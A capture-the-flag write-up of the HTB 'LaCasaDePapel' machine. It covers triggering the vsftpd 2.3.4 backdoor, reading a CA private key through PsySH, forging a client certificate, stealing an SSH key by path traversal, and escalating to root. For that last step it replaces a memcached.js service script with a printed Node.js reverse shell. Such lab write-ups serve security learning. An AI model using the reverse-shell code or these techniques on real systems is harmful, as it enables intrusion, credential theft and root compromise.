# LaCasaDePapel

Yes interestingly, I came to know of the Netflix series through this box so who knows, I might watch the series one day!


![heist](heist.jpg)

## Basic enumeration
Back to the box, first things first, nmap scan with flags -sV -sC:

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js Express framework
|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Issuer: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T08:35:30
| Not valid after:  2029-01-24T08:35:30
| MD5:   6ea4 933a a347 ce50 8c40 5f9b 1ea8 8e9a
|_SHA-1: 8c47 7f3e 53d8 e76b 4cdf ecca adb6 0551 b1b6 38d4
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix
```
and with flag --script=vuln:
```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
|_sslv2-drown: 
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js (Express middleware)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open  ssl/http Node.js Express framework
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     / [POST]
|   
|     References:
|       http://capec.mitre.org/data/definitions/274.html
|       http://www.mkit.com.ar/labs/htexploit/
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
Service Info: OS: Unix

```
We will notice a few ports open and listening: 21,22,80 and 443.

First, we enumerate the vsfptd service on port 21 to test for anonymous login with user anonymous and an arbitrary string as the password:
```
root@kali:~# ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): Anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
Nope, no luck this time.

## vsftpd exploit
Doing a search on exploits on this version of vsftpd, we find that there is a backdoor exploit on github by @In2econd that we can use to open a backdoor to port 6200 by calling a vsf_sysutil_extra() function with the ascii characters 0x3a and 0x29 in the username which correspond to a smiley face, and find the service listening on that port. https://github.com/In2econd/vsftpd-2.3.4-exploit.

Running the exploit script with the valid parameters leads us to a discover a Psy shell command line interface running on port 6200.
```
root@kali:~# python3 vsftpd_234_exploit.py 10.10.10.131 21 whoami
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
[+] Connected to backdoor on 10.10.10.131:6200
[+] Response:
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
root@kali:~# 
```
First we can start off by listing the possible commands to issue with the help command and list any variables with ls:
```
ls
Variables: $tokyo
help
  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
  dump       Dump an object or primitive.                                                                                
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
  show       Show the code for an object, class, constant, method or property.                                           
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
  whereami   Show where you are in the code.                                                                             
  throw-up   Throw an exception or error out of the Psy Shell.                                                           
  timeit     Profiles with a timer.                                                                                      
  trace      Show the current call stack.                                                                                
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
  clear      Clear the Psy Shell screen.                                                                                 
  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
  history    Show the Psy Shell history.                                                  Aliases: hist                  
  exit       End the current session and return to caller.                                Aliases: quit, q 
```
With the command show, we see a PHP method that seems to be for certificate generation, and a path to the certificate authority private key.
```
show tokyo
  > 2| class Tokyo {
    3| 	private function sign($caCert,$userCsr) {
    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6| 		openssl_x509_export($userCert, $userCertOut);
    7| 		return $userCertOut;
    8| 	}
    9| }
```
Reading a litle on how the Psy shell works, we can call functions by assigning them to a variable as such:
```
$foo=file_get_contents('/home/nairobi/ca.key')
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
  """
```
Wow we managed to obtain the CA's key! Lets see if php safe mode is deactivated and maybe we can get a shell!
```
$foo=shell_exec('echo helloworldd')    
PHP Fatal error:  Call to undefined function shell_exec() in Psy Shell code on line 1
```
Seems like we are stuck in safe mode. We can try to enumerate the contents of other directories and see what privileges we have.
Based on the fact that we were able to read the ca key, we should be user nairobi. Users enumerated from home directory:
```
$foo=scandir('/home/')
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```
We see user.txt in berlin's home directory and confirm that we are indeed not berlin when we try to access the .ssh folder:
```
$foo=scandir('/home/berlin')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
$foo=scandir('/home/berlin/.ssh')
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
```

## Web Enumeration
Moving on from the cli enumeration, we can check out the 2 webservices on 80 and 443!

80 (http):

![http](http.png)

The google authenticator seems to be a rabbit hole as the submit button redirects us to the same index page no matter the input.
Might be wrong, but let's look at the https service to see what we can do.

443 (https):

![https](https.png)

Seems like the CA key that we found might come in handy! This looks like it's expecting us to provide a client certificate signed by the CA cert that the site provides and the CA key that we got from the server. Following this guide: https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326, the steps are pretty simple to follow and we should be getting authentication in no time!

After uploading the p12 format cert we created, a pop-up should show, prompting us to verify the cert we want to use for authentication. Following that, we are presented with the index page!

![index](index.png)

## Path Traversal and Local File Inclusion (LFI)
Clicking on the sesason1 link will take us to a page with .avi files that are basically just empty text files. However, we can notice that the url has ```PATH``` as a query which means it could be vulnerable to path traversal and local file inclusion attacks.

![avi](avi.png)

Trying to view the /etc/passwd folder yields us an error from the ```fs.readdirSync``` method which tells us that only directory scanning is allowed.

```
<pre>Error: ENOTDIR: not a directory, scandir &#39;/home/berlin/downloads/../../../../etc/passwd/&#39;<br> &nbsp; &nbsp;at Object.fs.readdirSync
```
Was stuck at this point for quite a bit trying to bypass the path traversal and get remote code execution with blind injection methods. After looking through the forums, I realised we could get some clues from the path of the avi files that can allow for LFI.
```https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp```
The file path is base64 encoded and if we can get encode our path to the user.txt file from one level up, we'll get the hash! True enough it works! But lets see if we can get more files from the .ssh folder which may get us a shell on the server!

![lfi](lfi.png)

We can see that there is a id_rsa file that we can use for ssh authentication. No need for passwords!

![rsa](rsa.png)

With the private key, we can try authenticating as berlin, the user that we got our private key file from. 
```
root@kali:~/Downloads# chmod 600 id_rsa 
root@kali:~/Downloads# ssh -i id_rsa berlin@10.10.10.131
berlin@10.10.10.131's password: 

```
Seems like this isn't the key for this user. Lets try to see if professor works.

```
root@kali:~/Downloads# ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ 
```
And we're in!

## Privilege Escalation

First, let's see what files we have in the ```pwd``` and which of them are writeable/readeable
```
drwxr-sr-x    4 professo professo      4096 Jul 21 09:34 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rwxr-xr-x    1 professo professo     45651 Jul 21 09:34 LinEnum.sh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
-rwxr-xr-x    1 professo professo   4468984 Jul 21 09:35 pspy64
```
Next, we run some enumeration scripts and see what processes are running on the server:

LinEnum.sh:
```
Linux version 4.14.78-0-virt (buildozer@build-edge-x86_64) (gcc version 8.2.0 (Alpine 8.2.0)) #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018
....
[-] Can we read/write sensitive files:
-rw-r--r--    1 root     root          1548 Jan 31 21:49 /etc/passwd
-rw-r--r--    1 root     root           794 Jan 27 01:46 /etc/group
-rw-r--r--    1 root     root           259 Jul 27  2018 /etc/profile
-rw-r-----    1 root     shadow        1037 Jan 27 01:46 /etc/shadow
....
memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
```
We notice a memcached user which corresponds to the files we see in the user's directory. Could be helpful. Sensitive files are not writeable.

pspy:
```
...
2019/07/21 09:45:05 CMD: UID=65534 PID=9162   | /usr/bin/node /home/professor/memcached.js
```
The memcached file is being run not as ```root``` but as ```nobody```, as seen in the .ini file
```
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```
If we can somehow replace the memcached.js file with a js reverse shell, we can get a root shell! 

Since we have read write access in this folder, we can move the original memcached.js and .ini file to another folder and replace it with our own malicious memcached.js and .ini file.
Referring to 
https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md , we can craft a JS reverse shell script,
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
And change the .ini file command to execute memcached.js as root since the service is initialised with root privileges, the ini file will be run as root.
```
[program:memcached]
command = sudo -u root /usr/bin/node /home/professor/memcached.js
```

Now we can wait a bit for the cronjob to execute and get ourselves a root shell!
```
root@kali:~/Downloads# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.131] 56896
ls
bin
boot
dev
etc
home
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
swap
sys
tmp
usr
var
whoami
root
cd root
ls
root.txt
cat root.txt
586979c48efbef5909a23750cc07f511
```
Fun box overall, learnt a lot about process hijacking and manual cert generation and authentication for https sites. Hope you learned something from this too!
